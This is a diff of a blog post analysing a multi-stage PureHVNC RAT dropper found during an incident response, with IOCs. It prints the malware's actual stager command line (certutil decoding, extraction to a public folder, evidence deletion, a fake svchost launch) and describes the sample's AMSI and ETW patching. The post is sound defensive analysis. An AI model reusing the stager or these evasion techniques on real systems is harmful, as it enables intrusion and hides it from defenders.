@@ -1,5 +1,5 @@
 ---
-title: Seven - Malware Analysis - Multi-Stage PureHVNC RAT dropper
+title: Seven - Malware Analysis - Multi-Stage PureHVNC RAT
 date: 2025-08-06 01:00:00 +0530
 categories: [Days of Security, Reverse Engineering, Incident Response, Malware Analysis]
 tags: [Malware Analysis]
@@ -8,11 +8,12 @@ tags: [Malware Analysis]
 This piece of malware was spotted in one of the incident for which I led the response. It was executed, undetected by Defender for Endpoint and garned a full fledged IR investigation. I will not mention the whole IR process as this focuses more on the analysis of the dropper which was a multi-stage heavily obfucated python script & C# binary. 
 
 ### How we got here?
-The user received a phishing link on their personal email address and opened it on their corporate device and it started the infection. It originated through a  file-fix attack which downloaded and unzipped a zip archive, followed by more zip archives which originated from master zip file and were extracted. Python launcher and all dependencies were extracted from the zip archives in the "C:\Users\Public\Windows\" directory and it executed a python script in memory. Sadly I can't share the screenshots or more information as it might contain senstive information. From the very beginning, the attack happened through memory only. Here's the initial stager command. 
+The user received a phishing link on their personal email address and opened it on their corporate device and it started the infection. It originated through a  .lnk file which is consistent with previous PureHVNC infections. The .lnk file included a obfuscated script which initiated the download of a master zip archive.  
+That was followed by the creation more zip archives with .pdf extension which originated from master zip file and were extracted. Python launcher and all dependencies, including malware config file, were extracted from the zip archives in the "C:\Users\Public\Windows\" directory and it executed a python script in memory. I can't share the screenshots or more information as it might contain senstive information. From the very beginning, the attack happened mainly through memory only. Here's the initial stager command. 
 ```
-cmd /c cd "" && start "Google Ads Playbook.docx" && certutil -decode Document.pdf Invoice.pdf && images.png x -ibck -y poX3ff7b6Bfi76keXy3xmSWnX0uqsFYur Invoice.pdf C:\\Users\\Public && del /s /q Document.pdf && del /s /q Invoice.pdf && del /s /q images.png && del /s /q "Contract Invoice.docx" && del /s /q "Evidence Report.docx" && cd C:\\Users\\Public\\Windows && start svchost.exe Lib\\images.png MR_Q_NEW_VER_BOT && exit && exit
+cmd /c cd "" && start "Google Ads Playbook.docx" && certutil -decode Document.pdf Invoice.pdf && images.png x -ibck -y -poX3ff7b6Bfi76keXy3xmSWnX0uqsFYur Invoice.pdf C:\\Users\\Public && del /s /q Document.pdf && del /s /q Invoice.pdf && del /s /q images.png && del /s /q "Contract Invoice.docx" && del /s /q "Evidence Report.docx" && cd C:\\Users\\Public\\Windows && start svchost.exe Lib\\images.png MR_Q_NEW_VER_BOT && exit && exit
 ```
-Sadly I was not able to get my hands on the very initial payload which initated the download due to undisclosable reason. But the silver lining being we have the actual malicious payload and we know the methodology followed by the stager. Let's begin with the actual payload. All the IOCs will be mentioned in the appendix.
+Sadly I was not able to get my hands on the very initial payload which initated the download due to undisclosable reason hence, the lack of information in this step. But the silver lining is that we have the actual malicious payload and we know the methodology followed by the stager. Let's begin with the actual payload. All the IOCs will be mentioned in the appendix.
 
 ### Initial script
 The initial payload is a python script which is executed in memeory with the following command  
@@ -74,7 +75,20 @@ It turned out to be another base64 payload. Which is much more evident when the 
 ![wdckghr_crypted](/assets/purehvnc-dropper/dnspy_1.png)  
 ![wdckghr_crypted_2](/assets/purehvnc-dropper/dnspy_2.png)  
 
-It also reveals that the original file name is Wdckghr_crypted. It hold one key and one base64 and xor'ed text. Below are the functions responsible for decoding and executing the next steps  
+It also reveals that the original file name is Wdckghr_crypted. It hold one key and one base64 and xor'ed text. And it attempts to use textbook methods to patch AMSI & ETW to seemless script execution.  
+AMSI
+![AMSIPatch](/assets/purehvnc-dropper/PatchAMSI.png)
+![AMSIPayload](/assets/purehvnc-dropper/AMSI_Payload.png)  
+
+These functions collect the address of AMSI buffer in memory & patches the AMSI in such a way that it will always return 0x80070057(64-bit), which is the error code for invalid argument.
+
+ETW  
+![ETWPatch](/assets/purehvnc-dropper/PatchETW.png)
+![ETWPayload](/assets/purehvnc-dropper/ETWPayload.png)  
+
+Similarly these collect the address of ETWEventWrite in memory & patches the ETW so that function will just "return"(Decoded payload - "C3") and do nothing. 
+
+Below are the functions responsible for decoding and executing the next steps  
 
 ![function1](/assets/purehvnc-dropper/fun1.png)  
 ![function2](/assets/purehvnc-dropper/fun2.png)  
@@ -162,7 +176,8 @@ Below are a couple of screenshots from wireshark. One with internet enabled and 
 
 #### IOCs 
 
-Hashes -   
+Hashes -
+61c0515c70a2b451d3d59f9450e5bd060f73290214ae6a6990db6adc04d534a7 - Initial lnk file   
 96637bc629ca866ab5aa176e7ccb3cff9f93c8f9d021520a97f527bfa9d56d7e - Wdckhgr_crypted - First stage after python execution  
 289c09d43faaae05702f477f648dfd336085983f8253f834acd24960469335b7 - Donut shellcode  
 5baa860a2ee10bc859f527c686ec8f25b74860fe5d0f9138f8c7aeeb8dade7f4 - Sydxj - Intermediary stage  
@@ -170,7 +185,7 @@ cb783c1e27455f90fdd558d2a10604e35f830b7a07e0d820d3e2b49f17d1f787 - Sctgvth - Fin
 
 
 C2 -  
-162[.]218[.]115[.]218  
+162[.]218[.]115[.]218 (Connected on remote port 5600X)  
 
 Certificate Fingerprint -   
 SHA1 Fingerprint=CA:08:3A:47:C9:D5:C5:9B:FA:33:AB:56:97:8E:4D:1F:7B:5B:00:17  
